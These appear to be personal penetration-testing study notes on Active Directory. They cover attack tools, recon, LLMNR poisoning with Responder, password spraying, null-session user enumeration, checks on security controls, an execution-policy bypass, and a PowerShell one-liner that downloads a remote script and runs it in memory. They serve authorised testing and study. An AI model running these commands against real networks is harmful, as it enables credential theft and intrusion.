Navigation: [[Pentesting]]

---
# Table of Contents
1. Overview
2. Tools of the Trade
3. Methodology
4. Enumeration
	1. Passive recon
	2. Active recon
5. Initial Foothold
	1. LLMNR/NBT-NS Poisoning
	2. Password Spraying
6. Enumerating Security Controls
	1. Linux
	2. Windows
	3. Windows Native Tools
7. Kerberoasting

Useful Stuff:
[`WADComs Cheatsheet`](https://wadcoms.github.io/)
# Active Directory Overview
Here's a [video guide](https://www.youtube.com/watch?v=4qC7H-y7oKI) on active directory that should help to fill in some basic knowledge.

TODO:
- What is AD
- Account types
- Kerberos
- ACLs
- Domain trust
# Tools of the Trade
This entire table is taken from HTB Academy:

| Tool                                                                                                                                          | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                      | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.                                                                                                                                                                                             |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                               | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                       |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py)                                                                                      | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.                                                                                                                                                                                                                                                                                                                      |
| [Kerbrute](https://github.com/ropnop/kerbrute)                                                                                                | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)                                                                                | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                                                                                                                                                                                                                                                                                                                              |
| [Responder](https://github.com/lgandx/Responder)                                                                                              | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)                                                             | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)                                                    | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)                                           | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.                                                                                                                                                             |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)                                                               | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)                                                                             | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.                                                                                                                                                                                                                                                                                                                                  |
| [Rubeus](https://github.com/GhostPack/Rubeus)                                                                                                 | Rubeus is a C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)                                              | Another Impacket module geared towards finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [Hashcat](https://hashcat.net/hashcat/)                                                                                                       | A great hash cracking and password recovery tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)                                                                                   | A tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)                                                                                       | A rework of the original Enum4linux tool that works a bit differently.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch)                                                                                          | Built-in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| [windapsearch](https://github.com/ropnop/windapsearch)                                                                                        | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)                                                                    | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)                                                                                      | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                                                                                                                                                                                                                                                                              |
| [smbmap](https://github.com/ShawnDEvans/smbmap)                                                                                               | SMB share enumeration across a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)                                                        | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)                                                      | Part of the Impacket toolkit, it provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [Snaffler](https://github.com/SnaffCon/Snaffler)                                                                                              | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)                                                  | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))             | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| [Mimikatz](https://github.com/ParrotSec/mimikatz)                                                                                             | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)                                              | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm)                                                                                       | Provides us with an interactive shell on a host over the WinRM protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                                              | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [noPac.py](https://github.com/Ridter/noPac)                                                                                                   | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)                                                      | Part of the Impacket toolset, RPC endpoint mapper.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)                                                       | Printnightmare PoC in python.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)                                                | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [PetitPotam.py](https://github.com/topotam/PetitPotam)                                                                                        | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)                                                        | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)                                                              | This tool will use an existing TGT to request a PAC for the current user using U2U.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump)                                                                                          | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                        | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)                                                | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.                                                                                                                                                                                                                                                                                                                             |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)                                                  | SID bruteforcing tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)                                                    | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)                                                | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)                                               | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.                                                                                                                                                   |
| [PingCastle](https://www.pingcastle.com/documentation/)                                                                                       | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                               |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                 | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                              |
# Methodology
# Enumeration
### External Recon
When starting our external recon, we should be looking for a few key things:

| Data                | Items                                                                       |
| ------------------- | --------------------------------------------------------------------------- |
| Network Information | Valid ASNs, netblocks, cloud presence, DNS entries, hosting providers, etc. |
| Domain Information  | Domains, subdomains, services, and possible defenses.                       |
| Schema Format       | Formats of accounts, valid usernames, etc.                                  |
| Data Discolsure     | Publicly accessible files, credentials in these files (such as on GitHub).  |
| Breach Data         | Any publicly released data, including usernames, passwords, and other info. |
Search locations:

| Resource                    | Locations                                                                                                                                                                                                                                                                                         |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ASN and IP registrars       | [`IANA`](https://www.iana.org/), [`arin`](https://www.arin.net/), [`HE`](https://bgp.he.net/) for Americas, [`RIPE`](https://www.ripe.net/) for Europe.                                                                                                                                           |
| Domain registrars and DNS   | [`Domaintools`](https://www.domaintools.com/), [`PTRArchive`](http://ptrarchive.com/), [`ICANN`](https://lookup.icann.org/lookup) and manual DNS record requests.                                                                                                                                 |
| Social Media                | Self explanatory.                                                                                                                                                                                                                                                                                 |
| Company Websites            | Also self explanatory, focus on "About Us" and "Contact Us" pages though                                                                                                                                                                                                                          |
| Cloud and Developer Storage | GitHub, AWS S3, Azure storage, [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database). [`Trufflehog`](https://github.com/trufflesecurity/truffleHog) and sites like [`Greyhat Warfare`](https://buckets.grayhatwarfare.com/) can be used to find leaked credentials. |
| Breaches                    | [`HaveIBeenPwned`](https://haveibeenpwned.com/) to check if any accounts appear in breach data, [`Dehashed`](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes                                                                                         |
Here's a useful [tool](https://github.com/initstring/linkedin2username) for creating false emails using `LinkedIn` data.
### Internal Enumeration
This section should be largely familiar. See [[Network Enumeration with Nmap]] to get started. Here's some additional tools though:
- [`Fping`](https://fping.org/) for ping scanning
- [`Kerbrute`](https://github.com/ropnop/kerbrute) since Kerberos authentication failures usually don't trigger logs or alerts. 
	- Use [this](https://github.com/insidetrust/statistically-likely-usernames) wordlist for potential usernames.
- [`Responder`](https://github.com/lgandx/Responder-Windows) to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses.
- `TCPDump` and `Wireshark` for a more passive way to find hosts
# Initial Foothold
### LLMNR/NBT-NS Poisoning
LLMNR and NBT-NS are Microsoft backups for when DNS fails. LLMNR is used first, based on the DNS format allowing hosts on the same local link to perform name resolution, and uses `UDP/5355`. A machine will ask all others on the network for the correct host address via LLMNR. When LLMNR fails, NetBIOS Name Service is used over `UDP/137`. 

Here's the general overview of how poisoning works:
1. Host attempts to connect to server, but makes a typo in the address
2. DNS server responds, stating host unknown
3. Host then asks over LLMNR if anyone knows the location of the (incorrectly typed) server address
4. Attacker responds that they have the address
5. Host believes the reply and sends an authentication request to the server with credentials
6. Attacker takes credentials and uses them

**Starting a Poisoning Attack on Linux**
```shell 
sudo responder -I <interface>
```
Once we're able to grab hashes, we can crack using `hashcat`. See [[Password Attacks]]. For quick reference, here's how we can do a `NTMLv2` hash:
```shell
hashcat -m 5600 <hash file> <wordlist>
```
**Poisoning on Windows**
Outdated method:
```PowerShell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters # Print options
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Current method (same tool, author just moved to C#):
```PowerShell
.\Inveigh.exe
```
From here, press `ESC` to enter and exit the interactive console. Type `HELP` to see commands and access hashes.
### Password Spraying
Password spraying should be done sparingly in order to prevent mass account lockout. In order to do it effectively, we should follow a few steps:
1. Enumerate enough to understand the username structure and potential password policy of our target
2. Create a target user list based on this enumeration
3. Spray lightly using our lists
##### Finding a Password Policy
With valid domain credentials, finding a password policy is pretty easy. Here's how we can do it remotely:
```shell
crackmapexec smb <IP> -u <user> -p <pass> --pass-pol
```
But this isn't really the point of this section. Instead we want to know how to find a policy without credentials. This can be done through SMB NULL sessions or LDAP anonymous bind.

Here's some ways we can do SMB Null sessions:

Using [`rpcclient`](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) on Linux:
```shell
rpcclient -U "" -N <IP>
querydominfo # get domain information
getdompwinfo # get password policy
```
Use [enum4linux-ng](https://github.com/cddmp/enum4linux-ng), it's a rewrite of the original with a few extra features:
```shell
enum4linux -P <IP> # deprecated
enum4linux-ng -P <IP> -oA <Output file> 
```

Our next option is LDAP anonymous binds, which allows unauthenticated users to retrieve information about a domain. It's been deprecated as of Windows server 2003.

On Linux, we can use [`ldapsearch`](https://linux.die.net/man/1/ldapsearch): 
```shell
ldapsearch -h <IP> -x -b "DC=<Domain Controller>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Lastly, enumerating from Windows is rare but here's a few commands to do so:
```powershell
# SMB Null
net use \\host\ipc$ "" /u:""
# We can also try using a guest account:
net use \\DC01\ipc$ "password" /u:guest

# Simple commands to display net information
net accounts

# Powershell script
import-module .\PowerView.ps1
Get-DomainPolicy
```
##### Creating a Users List
Here's some ways we can generate a users list:
1. Using the SMB NULL session or LDAP anonymous again
2. `Kerbrute` to validate users utilizing a wordlist from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo or gathered using [`linkedin2username`](https://github.com/initstring/linkedin2username)
3. Using a set of credentials from a system provided by the client or obtained through other means

**SMB Null To Grab Users**
```shell
enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N <IP>
enumdomusers

crackmapexec smb <IP> --users
```
**LDAP Anonymous**
Use [`windapsearch`](https://github.com/ropnop/windapsearch) and [`ldapsearch`](https://linux.die.net/man/1/ldapsearch):
```shell
ldapsearch -h <IP -x -b "DC=<domain>,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip <IP> -u "" -U
```
**Kerbrute**
Using the [`jsmith.txt`](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist in the format `flast`:
```shell
kerbrute userenum -d <domain> --dc <DC IP> /opt/jsmith.txt 
```

With credentialed enumeration, it's once again really easy to get a users list:
```shell
sudo crackmapexec smb <IP> -u <user> -p <pass> --users
```
##### Spraying from Linux
There's many tools that can be used for this, here's a few:
```shell
# Crackmapexec
sudo crackmapexec smb <host> -u valid_users.txt -p <Password> | grep +
sudo crackmapexec smb <host> -u <User> -p <Password> # validating creds

# Kerbrute
kerbrute passwordspray -d <domain> --dc <IP> valid_users.txt <Password>

# Bash one-liner
for u in $(cat valid_users.txt);do rpcclient -U "$u%<Password>" -c "getusername;quit" <IP> | grep Authority; done
```

Here's a way to spray a hash against many machines:
```shell
sudo crackmapexec smb --local-auth <CIDR Range> -u administrator -H <hash> | grep +
```
The `--local-auth` flag tells the tool to only attempt one log in per machine so we don't lock out an account.
##### Spraying from Windows
Once again this is rare, but the easiest way to do it is from PowerShell using [`DomainPasswordSpray`](https://github.com/dafthack/DomainPasswordSpray):
```PowerShell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <Password> -OutFile spray_success -ErrorAction SilentlyContinue

# This tool generates a user list for us, if we wanted to set one we could use the flag -UserList
```
# Enumerating Security Controls
Before reading this section, check out [[Linux Privilege Escalation]] and [[Windows Privilege Escalation]] for more details regarding local privesc. For any of this enumeration to work, we'll always need valid credentials for at least a single domain user.

### Important Security Controls
**Windows Defender**
Windows has their own firewall that'll block a lot of our tools. If it's enabled, it'll need to be bypassed later. Here's how we can check its status (Look at `RealTimeProtectionEnabled`):
```PowerShell
Get-MpComputerStatus
```
**AppLocker**
This is Microsoft's solution to an application whitelist. It's common for organizations to block `cmd.exe` and `powershell.exe`. Many organizations block only one instance of PowerShell, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations).
```PowerShell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
**PowerShell Constrained Language Mode**
This locks down a lot of PowerShell features, such as blocking COM objects, only allowing approved .NET types, etc. We can check using:
```PowerShell
$ExecutionContext.SessionState.LanguageMode
```
**Windows LAPS**
Microsoft came out with the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to randomize and rotate local admin passwords to help prevent lateral movement. The [`LAPSToolkit`](https://github.com/leoloobeek/LAPSToolkit) helps to enumerate this:
```PowerShell
# Find groups who can read LAPS passwords
Find-LAPSDelegatedGroups

# Check rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights

# Search for computers that have LAPS enabled when passwords expire, and display these passwords if the current user has access
Get-LAPSComputers
```
### Linux Enumeration
There's many tools we can use for this, we'll go over a few here:
**CME**
```shell
# CME gives a help menu for each protocol. For now, we'll only look at ssh
# General access
sudo crackmapexec smb <IP> -u <user> -p <pass>
# Important flags:
# --users: enumerate domain users
# --groups: enumerate domain groups
# --loggedon-users: find which users are currently logged on
# --shares: view SMB shares
# -M spider_plus --share '<share>': enumerates a share
```
##### SMBMap
```shell
# Check accessible shares
smbmap -u <user> -p <pass> -d <domain> -H <IP>
# List all directories in a share
smbmap -u <user> -p <pass> -d <domain> -H <IP> -R '<share>' --dir-only
```
##### RPCClient
[Docs](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
```shell
# Connect to a client
rpcclient -U "" -N <IP>

# RPC commands
queryuser <rid> # Gets user information
enumdomainusers # gets users and rids
```
##### Impacket Toolkit
```shell
# psexec.py gives RCE as SYSTEM by dropping an executable into ADMIN$
psexec.py <domain>/<user>:'<pass>'@<IP> 

# wmiexec.py, generates less logs
wmiexec.py <domain>/<user>:'<pass>'@<IP> 
```

Lastly, another tool we can use is [`Windapsearch`](https://github.com/ropnop/windapsearch).
### Windows Enumeration
##### ActiveDirectory PowerShell Module
[This](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) is a very common module to see since it's commonly used to administrate AD environments from the command line. Here's how we can use it:
```PowerShell
# Check imported modules
Get-Module
# Import the module
Import-Module ActiveDirectory
# Get domain information
Get-ADDomain
# Get users and permissions (discluding service principle accounts)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# Get trust relationships
Get-ADTrust -Filter *
# Get groups
Get-ADGroup -Filter * | select name
# Detailed group info
Get-ADGroup -Identity "<Group name>"
# Get group members
Get-ADGroupMember -Identity "<Group name>"

```
##### PowerView
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a PowerShell tool with a whole lot of different commands we can run. Use the table below for command reference:

| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

PowerView is now deprecated and moved to [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework. SharpView is a C# port of PowerView that works similarly.
##### Snaffler
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool to acquire a whole lot of credentials:
```PowerShell
.\Snaffler.exe  -d <domain> -s -v data -o snaffler.log
# -s prints to console
# -v specifies verbosity
```
### Enumerating with Native Tools
**Basic Enumeration**

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|
**Basic PowerShell Commandlets** 

| **Cmd-Let**                                                                                                                                                                        | **Description**                                                                                                                                                                                                                               |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                                                                                       | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                                                                        | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                                                                        | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                                                                               | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env: APPDATA\Microsoft\Windows \Powershell\PSReadline\ ConsoleHost_history.txt`<br><br>Note that spaces have been added to this command to help better fit the table | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`                                                         | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

Often times, defenders don't realize that there are multiple versions of PowerShell on a host. If they aren't uninstalled, they can be used; this is important since tracking only happens for PS 3.0 and onward. Here's how to do so:
```PowerShell
Get-host # Get PS Version
powershell.exe -version 2 # Change version
```
**Checking Defenses**
```PowerShell
# Firewall
netsh advfirewall show allprofiles

# Check defender from CMD
sc query windefend

# All defenses
Get-MpComputerStatus

# Checking who's logged on (make sure it's only you)
qwinsta
```
**Check Network Information**
```PowerShell
# List arp table and known hosts
arp -a

# List adapter settings
ipconfig /all

# Display routing table
route print
```
**WMI Scripting Engine**
```PowerShell
# Print patch level and hotfixes applied
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Display basic host info
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# List all processes
wmic process list /format:list

# List info about domains and domain constrollers
wmic ntdomain list /format:list

# List local account and domain accounts logged into device
wmic useraccount list /format:list

# List all local groups
wmic group list /format:list

# Dump information about system accounts being used as service accounts
wmic sysaccount list /format:list
```
Useful: [WMI Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)  and [WMI Docs](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi)

**Net Commands**

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
